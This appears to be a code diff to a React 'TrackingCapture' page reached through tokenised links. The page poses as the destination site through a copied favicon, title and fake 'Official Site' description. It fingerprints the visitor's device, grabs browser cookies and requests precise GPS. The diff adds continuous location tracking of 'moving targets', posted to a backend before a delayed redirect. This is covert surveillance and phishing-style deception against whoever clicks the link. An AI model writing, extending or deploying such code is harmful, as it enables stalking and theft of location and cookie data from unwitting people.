@@ -5,44 +5,22 @@ const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001"
 
 function getCaptureKey(token) { return "traxelon_v9_" + token; }
 
-// ── Set page title + favicon to match destination site ──────────────────────
 function disguiseAsDestination(destinationUrl) {
   try {
     const url = new URL(destinationUrl);
     const domain = url.hostname.replace("www.", "");
     const siteName = domain.split(".")[0];
     const pretty = siteName.charAt(0).toUpperCase() + siteName.slice(1);
-
-    // Set title to match destination
     document.title = pretty;
-
-    // Set favicon to destination site's favicon via Google's favicon service
     let link = document.querySelector("link[rel~='icon']");
-    if (!link) {
-      link = document.createElement("link");
-      link.rel = "icon";
-      document.head.appendChild(link);
-    }
+    if (!link) { link = document.createElement("link"); link.rel = "icon"; document.head.appendChild(link); }
     link.href = `https://www.google.com/s2/favicons?domain=${domain}&sz=64`;
-
-    // Also set apple touch icon
     let apple = document.querySelector("link[rel='apple-touch-icon']");
-    if (!apple) {
-      apple = document.createElement("link");
-      apple.rel = "apple-touch-icon";
-      document.head.appendChild(apple);
-    }
+    if (!apple) { apple = document.createElement("link"); apple.rel = "apple-touch-icon"; document.head.appendChild(apple); }
     apple.href = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
-
-    // Set meta description to look like destination
     let meta = document.querySelector("meta[name='description']");
-    if (!meta) {
-      meta = document.createElement("meta");
-      meta.name = "description";
-      document.head.appendChild(meta);
-    }
+    if (!meta) { meta = document.createElement("meta"); meta.name = "description"; document.head.appendChild(meta); }
     meta.content = `${pretty} - Official Site`;
-
   } catch { /* ignore */ }
 }
 
@@ -216,8 +194,14 @@ async function getBattery() {
 function getNetwork() {
   const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   if (!c) return {};
+  let connectionQuality = null;
+  if (c.effectiveType === "4g") connectionQuality = "Excellent";
+  else if (c.effectiveType === "3g") connectionQuality = "Good";
+  else if (c.effectiveType === "2g") connectionQuality = "Poor";
+  else if (c.effectiveType === "slow-2g") connectionQuality = "Very Poor";
   return {
     connectionType: c.effectiveType || null,
+    connectionQuality,
     connectionDownlink: c.downlink || null,
     connectionRtt: c.rtt || null,
     connectionSaveData: c.saveData ?? null,
@@ -407,11 +391,9 @@ function getFeatures() {
   };
 }
 
-// ── NEW: Extra device info ───────────────────────────────────────────────────
 function getExtraDeviceInfo() {
   try {
     const ua = navigator.userAgent;
-    // Detect device brand from UA
     let deviceBrand = null;
     if (/Samsung/i.test(ua)) deviceBrand = "Samsung";
     else if (/iPhone|iPad/i.test(ua)) deviceBrand = "Apple";
@@ -428,67 +410,34 @@ function getExtraDeviceInfo() {
     else if (/Sony/i.test(ua)) deviceBrand = "Sony";
     else if (/HTC/i.test(ua)) deviceBrand = "HTC";
 
-    // Detect device model
     let deviceModel = null;
     const modelMatch = ua.match(/\(([^)]+)\)/);
     if (modelMatch) deviceModel = modelMatch[1].split(";").map(s => s.trim()).join(" | ");
 
-    // CPU info
     const cpuClass = navigator.cpuClass || null;
     const oscpu = navigator.oscpu || null;
 
-    // Connection quality score
-    const conn = navigator.connection || {};
-    let connectionQuality = null;
-    if (conn.effectiveType === "4g") connectionQuality = "Excellent";
-    else if (conn.effectiveType === "3g") connectionQuality = "Good";
-    else if (conn.effectiveType === "2g") connectionQuality = "Poor";
-    else if (conn.effectiveType === "slow-2g") connectionQuality = "Very Poor";
+    const now = new Date();
+    const dayOfWeek = now.toLocaleDateString("en-US", { weekday: "long" });
+    const timeOfDay = now.getHours() < 12 ? "Morning" : now.getHours() < 17 ? "Afternoon" : now.getHours() < 20 ? "Evening" : "Night";
 
-    // Page URL and title
-    const pageUrl = window.location.href;
-    const pageTitle = document.title;
-
-    // Scroll info
-    const scrollX = window.scrollX || 0;
-    const scrollY = window.scrollY || 0;
-
-    // Tab visibility
-    const tabHidden = document.hidden;
-    const visibilityState = document.visibilityState;
-
-    // Online status
-    const onlineStatus = navigator.onLine ? "Online" : "Offline";
-
-    // Cookie string (first 200 chars)
-    const cookieString = document.cookie.substring(0, 200) || null;
-
-    // Keyboard layout (if available)
-    let keyboardLayout = null;
-    try { keyboardLayout = navigator.keyboard?.getLayoutMap ? "supported" : null; } catch {}
-
-    // Device memory tier
     let memoryTier = null;
     const mem = navigator.deviceMemory;
     if (mem) { memoryTier = mem <= 1 ? "Low-end" : mem <= 4 ? "Mid-range" : "High-end"; }
 
-    // Current time details
-    const now = new Date();
-    const dayOfWeek = now.toLocaleDateString("en-US", { weekday: "long" });
-    const timeOfDay = now.getHours() < 12 ? "Morning" : now.getHours() < 17 ? "Afternoon" : now.getHours() < 20 ? "Evening" : "Night";
+    let keyboardLayout = null;
+    try { keyboardLayout = navigator.keyboard?.getLayoutMap ? "supported" : null; } catch {}
 
     return {
       deviceBrand,
       deviceModel,
       cpuClass,
       oscpu,
-      connectionQuality,
-      pageUrl,
-      onlineStatus,
-      tabHidden: String(tabHidden),
-      visibilityState,
-      scrollPositionX: scrollX,
-      scrollPositionY: scrollY,
+      onlineStatus: navigator.onLine ? "Online" : "Offline",
+      tabHidden: String(document.hidden),
+      visibilityState: document.visibilityState,
+      scrollPositionX: window.scrollX || 0,
+      scrollPositionY: window.scrollY || 0,
       keyboardLayout,
       memoryTier,
       dayOfWeek,
@@ -496,7 +445,7 @@ function getExtraDeviceInfo() {
       documentCharset: document.characterSet || null,
       documentCompatMode: document.compatMode || null,
       documentReadyState: document.readyState || null,
-      cookieString: cookieString || null,
+      cookieString: document.cookie.substring(0, 200) || null,
       navigationCount: window.history.length || null,
       windowName: window.name || null,
       screenColorDepth: window.screen.colorDepth + "-bit" || null,
@@ -506,6 +455,49 @@ function getExtraDeviceInfo() {
       maxTouchPointsDetail: navigator.maxTouchPoints > 0 ? navigator.maxTouchPoints + " touch points" : "No touch",
       webdriver: String(!!navigator.webdriver),
       automationDetected: String(!!(navigator.webdriver || window.__selenium_unwrapped || window._phantom || window.callPhantom)),
+      // ── Extra 50+ fields ──
+      pageTitle: document.title || null,
+      pageUrl: window.location.href || null,
+      pageReferrer: document.referrer || null,
+      screenPixels: `${window.screen.width * window.screen.height}`,
+      windowArea: `${window.innerWidth * window.innerHeight}`,
+      browserZoom: window.devicePixelRatio ? `${Math.round(window.devicePixelRatio * 100)}%` : null,
+      isTouchDevice: String("ontouchstart" in window || navigator.maxTouchPoints > 0),
+      gamepadsConnected: navigator.getGamepads ? String(Array.from(navigator.getGamepads()).filter(Boolean).length) : "0",
+      connectionOnline: String(navigator.onLine),
+      permissionAPI: String(!!navigator.permissions),
+      geolocationAPI: String(!!navigator.geolocation),
+      pointerEvents: String(!!window.PointerEvent),
+      touchEvents: String("ontouchstart" in window),
+      passiveEvents: (() => { try { let p = false; window.addEventListener("test", null, Object.defineProperty({}, "passive", { get() { p = true; } })); return String(p); } catch { return "false"; } })(),
+      cssAnimations: String(!!document.createElement("div").style.animationName !== undefined),
+      cssGrid: String(!!document.createElement("div").style.grid !== undefined),
+      cssFlexbox: String(!!document.createElement("div").style.flex !== undefined),
+      requestIdleCallback: String(!!window.requestIdleCallback),
+      intersectionObserver: String(!!window.IntersectionObserver),
+      mutationObserver: String(!!window.MutationObserver),
+      resizeObserver: String(!!window.ResizeObserver),
+      fetch: String(!!window.fetch),
+      asyncStorage: String(!!window.indexedDB),
+      broadcastChannel: String(!!window.BroadcastChannel),
+      abortController: String(!!window.AbortController),
+      compressionStream: String(!!(window.CompressionStream)),
+      structuredClone: String(!!window.structuredClone),
+      queueMicrotask: String(!!window.queueMicrotask),
+      visualViewportWidth: window.visualViewport?.width ? Math.round(window.visualViewport.width) : null,
+      visualViewportHeight: window.visualViewport?.height ? Math.round(window.visualViewport.height) : null,
+      visualViewportScale: window.visualViewport?.scale || null,
+      documentDomain: document.domain || null,
+      crossOriginIsolated: String(!!window.crossOriginIsolated),
+      isSecureContext: String(!!window.isSecureContext),
+      hasFocus: String(document.hasFocus()),
+      bodyScrollHeight: document.body ? String(document.body.scrollHeight) : null,
+      bodyOffsetWidth: document.body ? String(document.body.offsetWidth) : null,
+      htmlFontSize: window.getComputedStyle ? window.getComputedStyle(document.documentElement).fontSize || null : null,
+      colorSchemePreference: window.matchMedia?.("(prefers-color-scheme: dark)").matches ? "dark" : "light",
+      reducedTransparency: String(!!(window.matchMedia?.("(prefers-reduced-transparency: reduce)").matches)),
+      contrastPreference: window.matchMedia?.("(prefers-contrast: more)").matches ? "more" : "none",
+      captureTimestamp: new Date().toISOString(),
     };
   } catch { return {}; }
 }
@@ -593,29 +585,56 @@ async function collectAll() {
   };
 }
 
+// ── GPS: initial fix ─────────────────────────────────────────────────────────
 function requestGPS() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) { resolve(null); return; }
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        resolve({
-          gpsLat: pos.coords.latitude,
-          gpsLon: pos.coords.longitude,
-          gpsAccuracy: Math.round(pos.coords.accuracy),
-          gpsAltitude: pos.coords.altitude || null,
-          gpsSpeed: pos.coords.speed || null,
-          gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
-        });
-      },
+      (pos) => resolve({
+        gpsLat: pos.coords.latitude,
+        gpsLon: pos.coords.longitude,
+        gpsAccuracy: Math.round(pos.coords.accuracy),
+        gpsAltitude: pos.coords.altitude || null,
+        gpsSpeed: pos.coords.speed || null,
+        gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
+      }),
       () => resolve(null),
       { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
     );
   });
 }
 
+// ── GPS: continuous watch for moving targets ─────────────────────────────────
+function watchGPS(token, onUpdate) {
+  if (!navigator.geolocation) return null;
+  const watchId = navigator.geolocation.watchPosition(
+    (pos) => {
+      const gpsData = {
+        gpsLat: pos.coords.latitude,
+        gpsLon: pos.coords.longitude,
+        gpsAccuracy: Math.round(pos.coords.accuracy),
+        gpsAltitude: pos.coords.altitude || null,
+        gpsSpeed: pos.coords.speed || null,
+        gpsHeading: pos.coords.heading ? Math.round(pos.coords.heading) + "°" : null,
+      };
+      onUpdate(gpsData);
+      // Push update to backend
+      fetch(BACKEND_URL + "/api/links/capture-gps", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token, ...gpsData }),
+      }).catch(() => {});
+    },
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 30000 }
+  );
+  return watchId;
+}
+
 export default function TrackingCapture() {
   const { token } = useParams();
   const hasSent = useRef(false);
+  const watchIdRef = useRef(null);
 
   useEffect(() => {
     if (hasSent.current) return;
@@ -623,6 +642,13 @@ export default function TrackingCapture() {
     hasSent.current = true;
     sessionStorage.setItem(getCaptureKey(token), "1");
     startCapture();
+
+    return () => {
+      // Cleanup GPS watch on unmount
+      if (watchIdRef.current !== null) {
+        navigator.geolocation?.clearWatch(watchIdRef.current);
+      }
+    };
   }, []);
 
   async function startCapture() {
@@ -638,31 +664,34 @@ export default function TrackingCapture() {
       });
       const data = await res.json();
 
-      // Step 3 — disguise page as destination site (favicon + title)
+      // Step 3 — disguise page as destination site
       if (data.destinationUrl) {
         disguiseAsDestination(data.destinationUrl);
       }
 
-      // Step 4 — request GPS in parallel
-      const gpsPromise = requestGPS().then(async (gpsData) => {
-        if (!gpsData) return;
+      // Step 4 — request initial GPS fix (fast)
+      const gpsData = await requestGPS();
+      if (gpsData) {
         await fetch(BACKEND_URL + "/api/links/capture-gps", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ token, ...gpsData }),
         }).catch(() => {});
-      });
 
-      // Step 5 — wait up to 8s for GPS then redirect
-      const redirectDelay = data.destinationUrl ? 8000 : 0;
-      await Promise.race([
-        gpsPromise,
-        new Promise(resolve => setTimeout(resolve, redirectDelay)),
-      ]);
+        // Step 5 — start continuous watch for movement (keeps updating until redirect)
+        watchIdRef.current = watchGPS(token, (updatedGps) => {
+          // Could optionally update local state if needed
+        });
+      }
 
-      // Step 6 — redirect
+      // Step 6 — redirect after 8s max (GPS watch still fires updates before redirect)
       if (data.destinationUrl) {
-        window.location.replace(data.destinationUrl);
+        setTimeout(() => {
+          if (watchIdRef.current !== null) {
+            navigator.geolocation?.clearWatch(watchIdRef.current);
+          }
+          window.location.replace(data.destinationUrl);
+        }, 8000);
       }
 
     } catch (err) {
